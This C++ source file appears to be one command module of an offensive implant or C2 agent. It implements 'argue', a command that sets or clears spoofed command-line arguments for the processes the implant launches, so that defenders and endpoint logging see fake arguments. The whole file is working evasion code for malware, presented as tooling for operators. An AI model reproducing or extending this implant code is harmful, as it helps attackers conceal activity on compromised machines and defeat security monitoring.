#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_ARGUE

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_argue(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t action_len = 0;
    auto action_str = parser_string( params, &action_len );

    if ( !action_str || action_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no action provided" ) ) );
        return;
    }

    char action_buf[16] = { 0 };
    memory::copy( action_buf, action_str, action_len < 15 ? action_len : 15 );

    if ( str_cmp( action_buf, symbol<char*>( const_cast<char*>( "clear" ) ) ) == 0 ) {
        if ( inst.argue_args ) {
            inst.heap_free( inst.argue_args );
            inst.argue_args = nullptr;
        }
        inst.argue_len = 0;

        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "Argument spoofing cleared" ) ) );
        return;
    }

    if ( str_cmp( action_buf, symbol<char*>( const_cast<char*>( "set" ) ) ) == 0 ) {
        uint32_t args_len = 0;
        auto args_str = parser_string( params, &args_len );

        if ( !args_str || args_len == 0 ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "no fake args provided" ) ) );
            return;
        }

        // Free existing buffer if set
        if ( inst.argue_args ) {
            inst.heap_free( inst.argue_args );
            inst.argue_args = nullptr;
        }

        inst.argue_args = static_cast<char*>( inst.heap_alloc( args_len + 1 ) );
        if ( !inst.argue_args ) {
            inst.argue_len = 0;
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
            return;
        }

        memory::copy( inst.argue_args, args_str, args_len );
        inst.argue_args[args_len] = '\0';
        inst.argue_len = args_len;

        // Build output: "Argument spoofing set: <fake_args>"
        uint32_t prefix_len = 24; // length of "Argument spoofing set: "
        uint32_t out_len = prefix_len + args_len + 1;
        auto output = static_cast<char*>( inst.heap_alloc( out_len ) );
        if ( !output ) {
            queue_response( inst, task_uuid, RESPONSE_SUCCESS,
                symbol<char*>( const_cast<char*>( "Argument spoofing set" ) ) );
            return;
        }

        str_copy( output, symbol<char*>( const_cast<char*>( "Argument spoofing set: " ) ) );
        uint32_t off = str_len( output );
        memory::copy( output + off, inst.argue_args, args_len );
        output[off + args_len] = '\0';

        queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
        inst.heap_free( output );
        return;
    }

    queue_response( inst, task_uuid, RESPONSE_ERROR,
        symbol<char*>( const_cast<char*>( "unknown action: use set or clear" ) ) );
}

#endif
